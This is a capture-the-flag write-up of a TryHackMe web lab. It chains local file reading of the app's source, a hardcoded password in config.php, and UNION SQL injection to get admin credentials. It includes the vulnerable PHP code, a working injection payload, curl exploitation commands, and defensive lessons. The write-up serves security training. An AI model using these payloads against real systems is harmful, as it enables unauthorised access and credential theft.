# Recruit (TryHackMe) - Web App Vulnerabilities I capstone

- **Path:** Jr Penetration Tester > Web Application Vulnerabilities I (final/capstone room)
- **Completed:** 2026-10-10 - **Target:** recruit_web_challengev1 @ <ip>:80 (over VPN)
- **Flags:** user `THM{…}` - admin `THM{…}`

A chained web attack: info disclosure (LFI) -> hardcoded cred -> foothold -> source-review finds
SQLi -> privilege escalation to admin. Uses most of the module in one box.

## Kill chain
1. **Recon.** Homepage (/) = Recruit Login (POST username/password/login). Links to `api.php`.
   dashboard.php 302 (needs auth). api.php is a FAQ page that leaks the endpoint
   `/file.php?cv=<URL>` ("fetch a candidate CV from a URL").
2. **/file.php = Local File Read (realpath jail).** Read its own source with it; the logic:
   ```php
   if (strpos($cv,'file://')!==0) die('Only local files are allowed');   // must start file://
   $filePath = str_replace('file://','',$cv);
   $realPath = realpath($filePath);                                       // normalises .. and symlinks
   if ($realPath===false || strpos($realPath,'/var/www/html')!==0) die('Access denied');
   echo file_get_contents($realPath);
   ```
   So http:// is blocked, and only files whose REAL path stays under /var/www/html are served.
   /var/www/db.php and /etc/passwd resolve outside the jail -> "Access denied" (no encoding/
   traversal bypass because realpath canonicalises and PHP auto-decodes $_GET).
3. **Source read -> HR password -> USER FLAG.** Read `file:///var/www/html/config.php`:
   `$HR_PASSWORD = '<redacted-pw>';` (left in config "temporarily"). index.php login logic:
   `username==="hr" && password===$HR_PASSWORD` -> $_SESSION['role']='hr'. Login hr/<redacted-pw>,
   GET /dashboard.php (role hr reads /user.txt) -> THM{…}.
4. **Source read -> find SQLi.** dashboard.php search:
   `$query = "SELECT * FROM candidates WHERE name LIKE '%$search%'"` (raw concat, errors printed).
   Runs for ANY logged-in user, so hr can use it. (The admin login branch uses a prepared
   statement, so the login itself is NOT injectable - had to leak the password elsewhere.)
5. **UNION SQLi -> admin creds.** candidates has 4 cols (id,name,position,status). As hr:
   `GET /dashboard.php?search=' UNION SELECT 1,username,password,4 FROM users-- -`
   -> injected row: name=admin, position=<redacted-pw> => users table has admin / <redacted-pw>.
6. **Admin login -> ADMIN FLAG.** Login admin/<redacted-pw> -> role admin -> dashboard reads
   /admin.txt -> THM{…}.

## Credentials / artefacts (lab)
- HR: hr / <redacted-pw> (from config.php)
- Admin: admin / <redacted-pw> (from users table via SQLi)
- dashboard.php also has a 2nd SQLi (the admin approve/reject action: `UPDATE candidates SET
  status='$status' WHERE id=$id` - $id unsanitised) but not needed for the flags.

## Commands
```
# LFI read any web-root file:
curl -s "http://<ip>/file.php?cv=file:///var/www/html/config.php"
# user flag:
curl -s -c c.txt -d "username=hr&password=<redacted-pw>&login=Login" http://<ip>/index.php
curl -s -b c.txt http://<ip>/dashboard.php | grep -o 'THM{…}]*}'
# admin creds via UNION SQLi (hr session), then admin login + flag:
curl -s -b c.txt -G http://<ip>/dashboard.php --data-urlencode "search=' UNION SELECT 1,username,password,4 FROM users-- -"
curl -s -c a.txt -d "username=admin&password=<redacted-pw>&login=Login" http://<ip>/index.php
curl -s -b a.txt http://<ip>/dashboard.php | grep -o 'THM{…}]*}'
```

## Lessons
- Information disclosure feeds exploitation: an LFI that only reads the app's OWN source was enough,
  because the source leaked a hardcoded password AND revealed the SQLi for privesc.
- realpath() jail is the RIGHT way to constrain an LFI (why db.php/etc were unreadable) - but it did
  not matter because secrets were inside the jail (config.php) and a second bug (SQLi) existed.
- Never hardcode credentials in source/config; parameterise ALL queries (login was safe, search was
  not - one missed query lost the box); don't echo SQL errors.
- Defence-in-depth: several controls had to each be wrong; fixing any one would have broken the chain.
